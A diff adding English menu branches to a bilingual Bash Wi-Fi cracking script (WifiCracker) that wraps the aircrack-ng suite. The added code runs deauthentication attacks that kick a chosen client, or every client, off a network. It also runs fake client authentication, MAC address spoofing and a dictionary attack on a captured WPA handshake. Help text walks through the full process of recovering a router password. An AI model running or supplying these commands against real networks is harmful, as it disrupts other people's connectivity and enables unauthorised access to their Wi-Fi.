@@ -303,6 +303,46 @@ wifiPassword(){
     sleep 10
   fi
 
+  # Es posible que tengas que volver a hacer este proceso varias veces, ya que hay que esperar a que se genere el Handshake.
+  # El Handshake se genera en el momento en el que el cliente se vuelve a reconectar a la red (esto no siempre es así, pero
+  # por fines prácticos nos será de utilidad verlo de esta forma)
+
+  # You may have to redo this process several times, because you have to wait for the handshake. The handshake is generated
+  # when the customer is reconnected to the network (this is not always true, but for practical purposes we will say that)
+  if [ "$engOptions" = "1" ]; then
+    echo " "
+    echo -e "$redColour This option should only be executed if you have already done steps 1, 4 and 5 ... otherwise you will not get anything$endColour"
+    sleep 3
+    echo " "
+    echo -n -e "$yellowColour Name of the dictionary (put it on the desktop, with corresponding extension): $endColour"
+    read dictionaryName
+    echo " "
+    echo -n -e "$yellowColour Name of the folder created in step 4: $endColour"
+    read folderName
+    echo " "
+    echo -n -e "$yellowColour Name of the file created in step 4 (with corresponding extension '.cap'): $endColour"
+    read archiveName
+    echo " "
+    echo -n -e "$yellowColour Enter your system username: $endColour"
+    read userSystem
+    echo " "
+    echo -e "$greenColour Let's proceed to find out the password...$endColour"
+    echo " "
+    sleep 5
+
+    # La sintaxis de 'aircrack-ng' es -> "aircrack-ng -w rutaDiccionario rutaFichero". De todos los ficheros que
+    # se han generado en la carpeta, el que nos interesa es el que tiene extensión '.cap'. A pesar de haber
+    # especificado el nombre del fichero anteriormente a la hora de crearlo, échale un ojo al nombre dentro de la
+    # carpeta de manera manual, puede que el nombre tenga ligeros cambios.
+
+    # The syntax of 'aircrack-ng' is -> "aircrack-ng -w dictionaryRoute fileRoute". From all files that have been generated
+    # in the folder, which interests us is the '.cap' extension file. Despite of the filename specified above, take a look
+    # to the name again inside the folder, the name may have slight changes.
+
+    aircrack-ng -w /home/$userSystem/Escritorio/$dictionaryName /home/$userSystem/Escritorio/$folderName/$archiveName
+    sleep 10
+  fi
+
 }
 
 resetProgram(){
@@ -313,6 +353,18 @@ resetProgram(){
     sleep 4
     echo " "
     echo -e "$greenColour Dando de baja el modo monitor...$endColour"
+    echo " "
+    sleep 3
+    airmon-ng stop mon0
+    value=1
+  fi
+
+  if [ "$engOptions" = "1" ]; then
+    echo " "
+    echo -e "$redColour You should choose this option in case you have already been using the previous ones$endColour"
+    sleep 4
+    echo " "
+    echo -e "$greenColour Disabling monitor mode...$endColour"
     echo " "
     sleep 3
     airmon-ng stop mon0
@@ -364,6 +416,47 @@ macAttack(){
 
 # Choose this option only if there are no clients connected to the network
 
+if [ "$engOptions" = "1" ]; then
+  echo " "
+  echo -n -e "$yellowColour Enter the name of the Wifi (ESSID): $endColour"
+  read wifiName
+  echo " "
+  echo -n -e "$yellowColour Enter the MAC address of the user you want to deauthenticate (STATION): $endColour"
+  read macClient
+  echo " "
+  echo -e "$greenColour We proceed to send deauthentication packets to the specified MAC address$endColour"
+  echo " "
+  echo -e "$greenColour It is advisable to wait 1 minute$endColour"
+  echo " "
+  echo -e "$greenColour When the minute has passed, press Ctrl + C to stop the process and from a new terminal choose option 7$endColour"
+  echo " "
+  sleep 13
+
+  # A continuación procederemos a deautenticar a un usuario de la red (echarlo de la red), para posteriormente esperar
+  # a que se genere el Handshake. Si quisiéramos hacer un Broadcast para echar a todos los usuarios de la red y
+  # esperar a que se genere el Handshake por parte de uno de los usuarios, tendríamos que especificar como dirección
+  # MAC la siguiente -> FF:FF:FF:FF:FF:FF
+
+  # Then we proceed to de-authenticate a network user, then we wait until handhsake is generated. If we want to make a
+  # Broadcast for de-authenticate all users from the same network and wait for the Handshake, we need to specify as
+  # MAC address -> FF:FF:FF:FF:FF:FF
+
+  aireplay-ng -0 0 -e $wifiName -c $macClient --ignore-negative-one mon0
+
+  # También podríamos haber hecho una deautenticación global y esperar a que se genere un Handshake por parte de
+  # uno de los clientes, para posteriormente por fuerza bruta usar el diccionario, esto es de la siguiente forma:
+  # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0
+
+  # We could have done a global deauthentication and wait until Handshake is generated, this is as follow:
+  # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0
+fi
+
+}
+
+# Escoge esta opción sólo si no hay clientes conectados a la red
+
+# Choose this option only if there are no clients connected to the network
+
 fakeAuth(){
 
   if [ "$spanOptions" = "1" ]; then
@@ -380,6 +473,25 @@ fakeAuth(){
     read wifiName
     echo " "
     echo -e "$greenColour Procedemos...$endColour"
+    echo " "
+    sleep 3
+    aireplay-ng -1 0 -e $wifiName -h $fakeMAC --ignore-negative-one mon0
+  fi
+
+  if [ "$engOptions" = "1" ]; then
+    echo " "
+    echo -e "$greenColour We will proceed to authenticate a false client in the network, from Terminal 1 you will see how this is added$endColour"
+    echo " "
+    echo -e "$greenColour Subsequently, select option 5 to send deauthentication packets to that client$endColour"
+    echo " "
+    sleep 5
+    echo -n -e "$yellowColour Enter a MAC address (You can use non-associated clients or your own [new] MAC address): $endColour"
+    read fakeMAC
+    echo " "
+    echo -n -e "$yellowColour Enter the name of the Wifi (ESSID): $endColour"
+    read wifiName
+    echo " "
+    echo -e "$greenColour We proceed...$endColour"
     echo " "
     sleep 3
     aireplay-ng -1 0 -e $wifiName -h $fakeMAC --ignore-negative-one mon0
@@ -572,6 +684,190 @@ necessaryPrograms(){
     fi
   fi
 
+  if [ "$engOptions" = "1" ]; then
+    echo " "
+    echo -e "$greenColour Let's see what programs you have installed and which ones are missing...$endColour."
+    sleep 3
+
+    if [ ! -x /usr/bin/aircrack-ng ];then
+
+      echo " "
+    	echo -e "$blueColour Aircrack-ng:$endColour$redColour Noy installed$endColour"
+      airng=1
+    	sleep 0.4
+
+    else
+    	echo " "
+    	echo -e "$blueColour Aircrack-ng:$endColour$greenColour Installed$endColour"
+      airng=0
+    	sleep 0.4
+    fi
+
+    if [ ! -x /usr/bin/macchanger ];then
+
+      echo " "
+    	echo -e "$blueColour Macchanger:$endColour$redColour Not installed$endColour"
+      macchg=1
+    	sleep 0.4
+
+    else
+    	echo " "
+    	echo -e "$blueColour Macchanger:$endColour$greenColour Installed$endColour"
+      macchg=0
+    	sleep 0.4
+    fi
+
+    if [ ! -x /usr/bin/xdotool ];then
+
+      echo " "
+    	echo -e "$blueColour Xdotool:$endColour$redColour Not installed$endColour"
+      xdt=1
+    	sleep 0.4
+
+    else
+    	echo " "
+    	echo -e "$blueColour Xdotool:$endColour$greenColour Installed$endColour"
+      xdt=0
+    	sleep 1
+    fi
+
+    if [ ! -x /usr/bin/nmap ];then
+
+      echo " "
+    	echo -e "$blueColour Nmap:$endColour$redColour Not installed$endColour"
+      nm=1
+    	sleep 0.4
+
+    else
+    	echo " "
+    	echo -e "$blueColour Nmap:$endColour$greenColour Installed$endColour"
+      nm=0
+    	sleep 1
+    fi
+
+    if [ "$airng" = "0" ] && [ "$macchg" = "0" ] && [ "$xdt" = "0" ] && [ "$nm" = "0" ]; then
+      echo " "
+      echo -e "$greenColour You have all the necessary programs...$endColour"
+      echo " "
+      echo -e "$redColour Press <Enter> to continue$endColour"
+      read
+    fi
+
+    if [ "$airng" = "1" ]; then
+      echo " "
+      echo -e "$greenColour 'aircrack-ng' will be installed on your computer, do you want to continue?$endColour $blueColour(Yes/No)$endColour"
+      echo -n "-> "
+      read respuestaA
+
+      case $respuestaA in
+
+        Yes | yes | Y | y ) echo " "
+             echo -e "$greenColour Starting the installation...$endColour"
+             echo " "
+             sleep 2
+             sudo apt-get install aircrack-ng
+             echo " "
+             echo -e "$blueColour Installation Finished!$endColour"
+             echo " "
+             echo -e "$redColour Press <Enter> to continue$endColour"
+             read
+             ;;
+
+        No | n | no | No ) echo " "
+             echo -e "$redColour Canceled 'aircrack-ng' installation...$endColour"
+             echo " "
+             sleep 3
+             ;;
+      esac
+    fi
+
+    if [ "$macchg" = "1" ]; then
+      echo " "
+      echo -e "$greenColour 'macchanger' will be installed on your computer, do you want to continue?$endColour $blueColour(Yes/No)$endColour"
+      echo -n -e "$yellowColour-> $endColour"
+      read respuestaB
+
+      case $respuestaB in
+
+        Yes | yes | Y | y ) echo " "
+             echo -e "$greenColour Starting the installation...$endColour"
+             echo " "
+             sleep 2
+             sudo apt-get install macchanger
+             echo " "
+             echo -e "$blueColour Installation Finished!$endColour"
+             echo " "
+             echo -e "$redColour Press <Enter> to continue$endColour"
+             read
+             ;;
+
+        No | n | no | No ) echo " "
+             echo -e "$redColour Canceled 'macchanger' installation...$endColour"
+             echo " "
+             sleep 3
+             ;;
+      esac
+    fi
+
+    if [ "$xdt" = "1" ]; then
+
+      echo " "
+      echo -e "$greenColour 'xdotool' will be installed on your computer, do you want to continue?$endColour $blueColour(Yes/No)$endColour"
+      echo -n -e "$yellowColour-> $endColour"
+      read respuestaC
+
+      case $respuestaC in
+
+        Yes | yes | Y | y ) echo " "
+             echo -e "$greenColour Starting the installation...$endColour"
+             echo " "
+             sleep 2
+             sudo apt-get install xdotool
+             echo " "
+             echo -e "$blueColour Installation Finished!$endColour"
+             echo " "
+             echo -e "$redColour Press <Enter> to continue$endColour"
+             read
+             ;;
+
+        No | n | no | No) echo " "
+             echo -e "$redColour Canceled 'xdotool' installation...$endColour"
+             echo " "
+             sleep 3
+             ;;
+      esac
+    fi
+
+    if [ "$nm" = "1" ]; then
+      echo " "
+      echo -e "$greenColour 'Nmap' will be installed on your computer, do you want to continue?$endColour $blueColour(Yes/No)$endColour"
+      echo -n -e "$yellowColour-> $endColour"
+      read respuestaD
+
+      case $respuestaD in
+
+      Yes | yes | Y | y ) echo " "
+             echo -e "$greenColour Starting the installation...$endColour"
+             echo " "
+             sleep 2
+             sudo apt-get install nmap
+             echo " "
+             echo -e "$blueColour Installation Finished!$endColour"
+             echo " "
+             echo -e "$redColour Press <Enter> to continue$endColour"
+             read
+             ;;
+
+        No | n | no | No ) echo " "
+             echo -e "$redColour Canceled 'Nmap' installation...$endColour"
+             echo " "
+             sleep 3
+             ;;
+      esac
+    fi
+  fi
+
+
 }
 
 autorInfo(){
@@ -581,6 +877,14 @@ autorInfo(){
     echo -e "$grayColour Programa hecho por Marcelo Raúl Vázquez Pereyra || Copyright 2016 © Marcelo Raúl Vázquez Pereyra$endColour"
     echo " "
     echo -e "$redColour Presiona <Enter> para volver al menú principal$endColour"
+    read
+  fi
+
+  if [ "$engOptions" = "1" ]; then
+    echo " "
+    echo -e "$grayColour Program made by Marcelo Raúl Vázquez Pereyra || Copyright 2016 © Marcelo Raúl Vázquez Pereyra$endColour"
+    echo " "
+    echo -e "$redColour Press <Enter> to return to main menu $endColour"
     read
   fi
 
@@ -596,6 +900,14 @@ versionSystem(){
     read
   fi
 
+  if [ "$engOptions" = "1" ]; then
+    echo " "
+    echo -e "$grayColour WifiCracker (v0.1.7) - Copyright 2016 © Marcelo Raúl Vázquez Pereyra$endColour"
+    echo " "
+    echo -e "$redColour Press <Enter> to return to main menu $endColour"
+    read
+  fi
+
 }
 
 panelHelp(){
@@ -605,44 +917,44 @@ panelHelp(){
     echo " "
     echo -e "$greenColour*******************************************************************************************$endColour"
     echo -e "$yellowColour  El primer paso es iniciar el modo monitor a través de la opción 1. Una vez iniciado
-    el modo monitor... eres capaz de escuchar y capturar cualquier paquete que viaje por el aire.
+  el modo monitor... eres capaz de escuchar y capturar cualquier paquete que viaje por el aire.
 
-    Puedes comprobar a través de la opción 2 si has iniciado correctamente la interfaz monitor.
-    Posteriormente, analizarás redes WiFis disponibles en tu entorno mediante la opción 4. Te
-    saldrán tanto clientes autenticados a una red como no asociados a ninguna. Cada cliente
-    está situado en 'STATION' y poseen una dirección MAC. Estos verás que están conectados a
-    una dirección MAC, correspondiente a la del routter (BSSID). Puedes ver de qué WiFi se trata
-    viendo su 'ESSID' correspondiente.
+  Puedes comprobar a través de la opción 2 si has iniciado correctamente la interfaz monitor.
+  Posteriormente, analizarás redes WiFis disponibles en tu entorno mediante la opción 4. Te
+  saldrán tanto clientes autenticados a una red como no asociados a ninguna. Cada cliente
+  está situado en 'STATION' y poseen una dirección MAC. Estos verás que están conectados a
+  una dirección MAC, correspondiente a la del routter (BSSID). Puedes ver de qué WiFi se trata
+  viendo su 'ESSID' correspondiente.
 
-    El programa te permitirá filtrar la red WiFi que deseas aislando el resto pasándole como
-    parámetro el nombre de la misma. Si salen varias veces la misma red, se tratan de
-    repartidores de señal. Una vez hecho esto una nueva carpeta será creada en el Escritorio
-    con el nombre que desees, esta contendrá varios ficheros... entre los cuales viajará
-    información encriptada, incluida la contraseña del routter. El que nos interesa es el de
-    extensión '.cap'.
+  El programa te permitirá filtrar la red WiFi que deseas aislando el resto pasándole como
+  parámetro el nombre de la misma. Si salen varias veces la misma red, se tratan de
+  repartidores de señal. Una vez hecho esto una nueva carpeta será creada en el Escritorio
+  con el nombre que desees, esta contendrá varios ficheros... entre los cuales viajará
+  información encriptada, incluida la contraseña del routter. El que nos interesa es el de
+  extensión '.cap'.
 
-    Una vez creadas las carpetas y ficheros, procedes a de-autenticar a los usuarios de la red.
-    En este caso te centrarás en un único usuario conectado a la red, para ello lo que harás
-    será escoger la dirección MAC del mismo y pasársela como parámetro cuando te sea pedida.
-    También se te permite la posibildad de realizar una de-autenticación global, de forma que
-    echarías a todos los usuarios de la red exceptuándote a ti mismo en caso de que estés
-    conectado a la misma, esto lo haces pasándole como dirección MAC -> FF:FF:FF:FF:FF:FF
+  Una vez creadas las carpetas y ficheros, procedes a de-autenticar a los usuarios de la red.
+  En este caso te centrarás en un único usuario conectado a la red, para ello lo que harás
+  será escoger la dirección MAC del mismo y pasársela como parámetro cuando te sea pedida.
+  También se te permite la posibildad de realizar una de-autenticación global, de forma que
+  echarías a todos los usuarios de la red exceptuándote a ti mismo en caso de que estés
+  conectado a la misma, esto lo haces pasándole como dirección MAC -> FF:FF:FF:FF:FF:FF
 
-    Una vez comience el 'ataque' y el usuario sea echado de la red, tendrás que parar el proceso
-    de de-autenticación y esperar a que se reconecte. Cuando se reconecta se genera lo que se
-    conoce como un 'Handshake', y es cuando capturamos la contraseña.
+  Una vez comience el 'ataque' y el usuario sea echado de la red, tendrás que parar el proceso
+  de de-autenticación y esperar a que se reconecte. Cuando se reconecta se genera lo que se
+  conoce como un 'Handshake', y es cuando capturamos la contraseña.
 
-    Por tanto, una vez hecho todo este proceso, mediante la opción 7 especificamos 2 rutas,
-    por un lado la del Diccionario (que deberá ser puesto en el Escritorio) y por otro la del
-    fichero '.cap' que se nos generó en la opción 4. El programa comenzará a trabajar hasta
-    averiguar la contraseña, la cual será mostrada en formato legible.$endColour
+  Por tanto, una vez hecho todo este proceso, mediante la opción 7 especificamos 2 rutas,
+  por un lado la del Diccionario (que deberá ser puesto en el Escritorio) y por otro la del
+  fichero '.cap' que se nos generó en la opción 4. El programa comenzará a trabajar hasta
+  averiguar la contraseña, la cual será mostrada en formato legible.$endColour
 
-   $blueColour Si te surgen dudas con alguna de las opciones, puedes usar '-h' acompañada de la opción
-    para ver qué función principal tiene la misma.
+ $blueColour Si te surgen dudas con alguna de las opciones, puedes usar '-h' acompañada de la opción
+  para ver qué función principal tiene la misma.
 
-    Ejemplo -> '-h1, -h3, -h5...'$endColour
+  Ejemplo -> '-h1, -h3, -h5...'$endColour
 
-  $greenColour**********************************************************************************************$endColour"
+$greenColour**********************************************************************************************$endColour"
     echo " "
     echo -e "$redColour Pulse <Enter> para volver al menú principal $endColour"
     read
@@ -663,14 +975,26 @@ showIP(){
     read
   fi
 
+  if [ "$engOptions" = "1" ]; then
+    echo " "
+    echo -n -e "$greenColour Your public IP adress is ->$endColour"
+    GET http://www.vermiip.es/ | grep "Tu IP p&uacute;blica es" | cut -d ':' -f2 | cut -d '<' -f1
+    echo " "
+    echo -n -e "$greenColour Your private IP adress is -> $endColour"
+    hostname -I
+    echo " "
+    echo -e "$redColour Press <Enter> to return to main menu $endColour"
+    read
+  fi
+
 }
 
 showMAC(){
 
   if [ "$spanOptions" = "1" ]; then
     echo " "
-    echo -e "$redColour  Para mostrar tu nueva dirección MAC desde la interfaz monitor es necesario que previamente lo
-    hayas dado de alta a través de la opción 1. De lo contrario, obtendrás errores.$endColour"
+    echo -e "$redColour Para mostrar tu nueva dirección MAC desde la interfaz monitor es necesario que previamente lo
+ hayas dado de alta a través de la opción 1. De lo contrario, obtendrás errores.$endColour"
     echo " "
     sleep 3
     echo -e "$greenColour Se va a mostrar tu nueva dirección MAC...$endColour"
@@ -681,15 +1005,30 @@ showMAC(){
     echo -e "$redColour Presiona <Enter> para volver al menú principal$endColour"
     read
   fi
+
+  if [ "$engOptions" = "1" ]; then
+    echo " "
+    echo -e "$redColour To display your new MAC address from the monitor interface, you must have previously registered
+ with option 1. Otherwise, you will get errors.$endColour"
+    echo " "
+    sleep 3
+    echo -e "$greenColour Your new MAC address will be displayed...$endColour"
+    echo " "
+    sleep 2
+    macchanger -s mon0 | grep Current
+    echo " "
+    echo -e "$redColour Press <Enter> to return to main menu $endColour"
+    read
+  fi
 }
 
 changeMAC(){
 
   if [ "$spanOptions" = "1" ]; then
     echo " "
-    echo -e "$redColour  Esta opción deberías ejecutarla en caso de haber ya iniciado el modo monitor a través de la opción 1.
+    echo -e "$redColour Esta opción deberías ejecutarla en caso de haber ya iniciado el modo monitor a través de la opción 1.
 
-    De lo contrario, obtendrás errores.$endColour"
+ De lo contrario, obtendrás errores.$endColour"
     echo " "
     sleep 3
     echo -e "$greenColour Procedemos a cambiar nuevamente tu dirección MAC en la interfaz 'mon0'...$endColour"
@@ -706,6 +1045,28 @@ changeMAC(){
     echo -e "$redColour Presiona <Enter> para volver al menú principal$endColour"
     read
   fi
+
+  if [ "$engOptions" = "1" ]; then
+    echo " "
+    echo -e "$redColour This option should be executed if you have already started the monitor mode through option 1.
+
+ Otherwise, you will get errors.$endColour"
+    echo " "
+    sleep 3
+    echo -e "$greenColour We proceed to change your MAC address again in the interface 'mon0'...$endColour"
+    echo " "
+    sleep 2
+    ifconfig mon0 down
+    echo " "
+    macchanger -a mon0
+    echo " "
+    ifconfig mon0 up
+    echo " "
+    echo -e "$blueColour Process Completed!, you can check your new MAC address through the option 8$endColour"
+    echo " "
+    echo -e "$redColour Press <Enter> to return to main menu $endColour"
+    read
+  fi
 }
 
 monitorHelp(){
@@ -715,17 +1076,35 @@ monitorHelp(){
     echo -e "$blueColour Opción 1$endColour "
     echo " "
     echo -e "$yellowColour  Esta opción te permite estar en modo monitor. La pregunta es por qué es tan necesario hacer
-    esto y qué finalidad tiene este mismo proceso.
+  esto y qué finalidad tiene este mismo proceso.
 
-    Cuando tú estás en modo monitor, eres capaz de escuchar y capturar cualquier tipo de paquete que viaje por el aire.
-    Es importante, puesto que debemos ser capaces de capturar las direcciones MAC de los clientes cercanos que tengamos
-    conectados a una red, para posteriormente de-autenticarlos (echarlos de la red) y esperar a que se reconecten
-    para capturar un Handshake. Por tanto esta opción es fundamental para iniciar todo el proceso que viene a continuación,
-    de lo contrario todas las opciones que usemos darán error.
+  Cuando tú estás en modo monitor, eres capaz de escuchar y capturar cualquier tipo de paquete que viaje por el aire.
+  Es importante, puesto que debemos ser capaces de capturar las direcciones MAC de los clientes cercanos que tengamos
+  conectados a una red, para posteriormente de-autenticarlos (echarlos de la red) y esperar a que se reconecten
+  para capturar un Handshake. Por tanto esta opción es fundamental para iniciar todo el proceso que viene a continuación,
+  de lo contrario todas las opciones que usemos darán error.
 
-    Debe ser la primera opción que escojamos.$endColour"
+  Debe ser la primera opción que escojamos.$endColour"
     echo " "
     echo -e "$redColour Pulse <Enter> para volver al menú principal $endColour"
+    read
+  fi
+
+  if [ "$engOptions" = "1" ]; then
+    clear
+    echo -e "$blueColour Opción 1$endColour "
+    echo " "
+    echo -e "$yellowColour  This option allows you to be in monitor mode. The question is why it is so necessary to do
+  this and what purpose this process has.
+
+  When you are in monitor mode, you are able to listen and capture any type of package that travels through the air.
+  It is important, since we must be able to capture the MAC addresses of the nearby clients that we have connected to a
+  network, and then de-authenticate them (throw them out of the network) and wait for them to reconnect to capture a
+  Handshake.
+
+  So this option is essential to start the whole process that follows, otherwise all the options we use will fail.$endColour"
+    echo " "
+    echo -e "$redColour Press <Enter> to return to main menu $endColour"
     read
   fi
 
